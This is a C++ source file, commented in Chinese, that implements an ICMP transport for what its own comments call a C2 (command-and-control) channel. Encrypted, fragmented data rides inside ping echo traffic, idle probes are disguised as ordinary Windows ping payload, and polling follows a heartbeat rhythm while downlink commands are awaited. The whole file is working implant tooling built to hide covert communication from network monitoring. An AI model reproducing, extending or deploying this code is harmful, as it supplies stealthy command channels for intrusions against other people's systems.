// IcmpTransport.cpp
#include "IcmpTransport.hpp"

#include "Core/Identity/SessionIdentity.hpp"
#include "Core/Comms/Transports/Icmp/IcmpWireCodec.hpp"
#include "Crypto/Engine/CryptoManager.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

#include <utility>

namespace cleat {

	namespace {
		// 上行分片队列上限的**兜底默认**: 实际值取自 ChannelCaps
		constexpr size_t kMaxQueuedFrags = 128;
	} // namespace

	IcmpTransport::IcmpTransport(std::unique_ptr<IIcmpOps> icmp)
		: icmp_(std::move(icmp)) {
	}

	IcmpTransport::~IcmpTransport() {
		Disconnect();
	}

	bool IcmpTransport::Connect(const TransportConfig& cfg) {
		std::lock_guard<std::mutex> lock(mutex_);
		cfg_ = cfg;
		if (!icmp_) {
			CLEAT_LOGE(ErrDom::Net, ErrCode::NotSupported, "IcmpTransport: 本平台未实现 ICMP 通道(工厂返回空)");
			return false;
		}
		if (cfg_.icmp_target.empty()) {
			CLEAT_LOGE(ErrDom::Net, ErrCode::InvalidParam, "IcmpTransport: 配置缺失 icmp_target");
			return false;
		}

		// 探活: 一次空 echo(目标可达即视为成功); 响应若带数据入缓存(防探活吞命令)
		std::vector<uint8_t> down;
		const bool ok = do_echo({}, down);
		connected_.store(ok);
		decrypt_fail_streak_ = 0;   // 新链路: 计数清零
		ClearDegraded();
		if (ok && !down.empty()) {
			std::vector<uint8_t> frame;
			if (reassembler_.Push(down, frame)) {
				pending_frame_ = std::move(frame);
			}
		}
		if (!ok) {
			LOG_WARN("IcmpTransport: 探活失败 target=" << cfg_.icmp_target);
		}
		else {
			LOG_INFO("IcmpTransport: 探活成功 target=" << cfg_.icmp_target);
		}
		return ok;
	}

	void IcmpTransport::Disconnect() {
		connected_.store(false);
		decrypt_fail_streak_ = 0;   // 链路级状态, 关闭即作废
		ClearDegraded();
		std::lock_guard<std::mutex> lock(mutex_);
		up_frags_.clear();
		reassembler_.Clear();
		pending_frame_.clear();
		slow_clock_.Reset();
		fast_clock_.Reset();
	}

			void IcmpTransport::NoteDecryptFailure() {
	MarkDegraded("downlink_decrypt_fail");
	if (++decrypt_fail_streak_ >= kDecryptFailThreshold) {
		CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "IcmpTransport: 连续 " << decrypt_fail_streak_
			<< " 次下行解密失败(key_id/密钥不匹配?), 判定链路不可用, 强制重连");
		decrypt_fail_streak_ = 0;
		connected_.store(false);   // 判 Dead -> 上层按既有路径换候选/重连
	}
	}

	void IcmpTransport::NoteDecryptSuccess() {
	decrypt_fail_streak_ = 0;
	ClearDegraded();
	}

	ChannelHealth IcmpTransport::HealthNow() const {
	if (!connected_.load()) return ChannelHealth::Dead;
	return degraded_.load() ? ChannelHealth::Degraded : ChannelHealth::Healthy;
	}

	void IcmpTransport::MarkDegraded(const char* why) {
	if (!degraded_.exchange(true)) {
		LOG_DEBUG("IcmpTransport: Health=Degraded (" << why << ")");
	}
	}

	bool IcmpTransport::IsConnected() const {
		return connected_.load();
	}

	bool IcmpTransport::Send(const std::vector<uint8_t>& frame) {
		if (!connected_.load()) {
			return false;
		}
		std::lock_guard<std::mutex> lock(mutex_);
		send_structural_.store(false);   // 本次调用复位; Write 只读本次结果

		std::vector<uint8_t> payload = frame;
		if (CryptoManager::Instance().IsEnabled()) {
			std::vector<uint8_t> enc;
			if (!CryptoManager::Instance().Encrypt(frame, enc)) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "IcmpTransport: 加密失败 (len=" << frame.size() << ")");
				return false;
			}
			payload = std::move(enc);
		}
		auto frags = DatagramCodec::Fragment(payload, icmp::kMaxFragPayload);
		// B2-3: 分片超 255 片(空返回) = 载荷过大, 报错而非静默失败
		if (frags.empty()) {
			// **永久**失败标记: Write 据此如实报 Dropped 而非
			// Rejected —— Rejected 会被 OutboundSink 回插队首永久卡死出站队列。
			send_structural_.store(true);
			CLEAT_LOGE(ErrDom::Net, ErrCode::ResourceExhausted, "IcmpTransport: 载荷过大, 分片超 255 片上限 (len=" << payload.size() << ")");
			return false;
		}
		// **整帧预检**: 同 DnsTransport —— 逐片丢队首会打洞本帧。
		const ChannelCaps caps = Caps();
		const size_t frag_cap = caps.maxQueuedUplinkFrags != 0 ? caps.maxQueuedUplinkFrags : kMaxQueuedFrags;
		if (up_frags_.size() + frags.size() > frag_cap) {
			overflow_.dropped_bytes += payload.size();   // 被拒整帧 = 因溢出未能上行的字节
			++overflow_.overflow_count;
			LOG_WARN("IcmpTransport: 上行队列余量不足, 整帧拒收 (need=" << frags.size()
				<< ", queued=" << up_frags_.size() << ", cap=" << frag_cap
				<< ", overflow_count=" << overflow_.overflow_count << ")");
			return false;
		}
		for (auto& f : frags) {
			up_frags_.push_back(std::move(f));
		}
		return true;
	}

	SendResult IcmpTransport::Write(const std::vector<uint8_t>& frame) {
		// 覆写默认映射: 与 DnsTransport::Write 同因同法 ——
		// 结构性超限是永久失败, 报 Dropped 让出站队列继续流动; 其余维持 Rejected。
		const bool ok = Send(frame);
		if (ok) {
			return SendResult::Queued;   // 仅入队, 随下次 Recv 交互落线
		}
		if (!IsConnected()) {
			return SendResult::ChannelFailure;
		}
		if (send_structural_.load()) {
			return SendResult::Dropped;
		}
		return SendResult::Rejected;
	}

	bool IcmpTransport::Recv(std::vector<uint8_t>& frame, int /*timeout_ms*/) {
		if (!connected_.load()) {
			return false;
		}
		std::lock_guard<std::mutex> lock(mutex_);

		// 优先交付缓存帧(探活返回), 不等待节流
		if (!pending_frame_.empty()) {
			std::vector<uint8_t> payload = std::move(pending_frame_);
			pending_frame_.clear();
			if (CryptoManager::Instance().IsEnabled()) {
				std::vector<uint8_t> dec;
				if (!CryptoManager::Instance().Decrypt(payload, dec)) {
					NoteDecryptFailure();
					CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "IcmpTransport: 缓存帧解密失败 (len=" << payload.size() << ")");
					return false;
				}
				frame = std::move(dec);
				NoteDecryptSuccess();   // 成功交付一帧 = 健康信号
			}
			else {
				frame = std::move(payload);
			}
			return true;
		}

		// 节流: 有上行数据/未注册时 1s 快速交互, 空闲按心跳节奏
		const bool fast = !up_frags_.empty()
			|| SessionIdentity::Instance().GetSessionId() == 0;
		if ((fast ? !fast_clock_.ShouldRun(true, false)
		          : !slow_clock_.ShouldRun(false, false))) {
			return false;
		}

		std::vector<uint8_t> up_frag;
		if (!up_frags_.empty()) {
			up_frag = std::move(up_frags_.front());
			up_frags_.pop_front();
		}

		std::vector<uint8_t> down_frag;
		if (!do_echo(up_frag, down_frag)) {
			connected_.store(false);   // 交互失败: 通知上层重连
			return false;
		}
		if (down_frag.empty()) {
			return false;   // 无下行数据(非错误)
		}

		std::vector<uint8_t> payload;
		if (!reassembler_.Push(down_frag, payload)) {
		// 仅在**未收齐**时置位(此前误插在 Push 之前, 成功重组也会被标记)
		MarkDegraded("I5 fragment_incomplete");
			return false;   // 分片未收齐
		}

		if (CryptoManager::Instance().IsEnabled()) {
			std::vector<uint8_t> dec;
			if (!CryptoManager::Instance().Decrypt(payload, dec)) {
				NoteDecryptFailure();
				CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "IcmpTransport: 下行解密失败 (len=" << payload.size() << ")");
				return false;
			}
			frame = std::move(dec);
			NoteDecryptSuccess();   // 成功交付一帧 = 健康信号(清零计数 + 清除 Degraded)
		}
		else {
			frame = std::move(payload);
		}
		return true;
	}

	void IcmpTransport::Reset() {
		Disconnect();
	}

	bool IcmpTransport::do_echo(const std::vector<uint8_t>& up_frag,
		std::vector<uint8_t>& down_frag) {
		down_frag.clear();
		// Plan A: 空上行(探活/空闲)走 Windows ping cover; 数据分片原样
		// 
		const std::vector<uint8_t> cover = icmp::WinPingCover();
		const std::vector<uint8_t>& wire = up_frag.empty() ? cover : up_frag;
		const bool ok = icmp_->Echo(cfg_.icmp_target, wire, down_frag,
			static_cast<int>(cfg_.timeout_ms));
		if (!ok) {
			LOG_DEBUG("IcmpTransport: echo 失败 target=" << cfg_.icmp_target);
			return false;
		}
		// 回显甄别: 非 C2 目标(普通协议栈)会把 payload 原样回显 —— 恰等于
		// cover 的应答视为"无下行数据"(真实下行分片为密文, 等于 cover 的概率可忽略)
		if (icmp::IsCoverEcho(down_frag)) {
			down_frag.clear();
		}
		LOG_DEBUG("IcmpTransport: echo ok up=" << wire.size()
			<< " down=" << down_frag.size());
		return true;
	}

	ChannelOverflowStats IcmpTransport::TakeOverflowStats() {
	std::lock_guard<std::mutex> lock(mutex_);
	const ChannelOverflowStats s = overflow_;   // "取走"语义: 复位防重复上报
	overflow_ = ChannelOverflowStats{};
	return s;
	}

	std::unique_ptr<ITransport> CreateIcmpTransport() {
		return std::make_unique<IcmpTransport>(CreateIcmpOps());
	}

} // namespace cleat
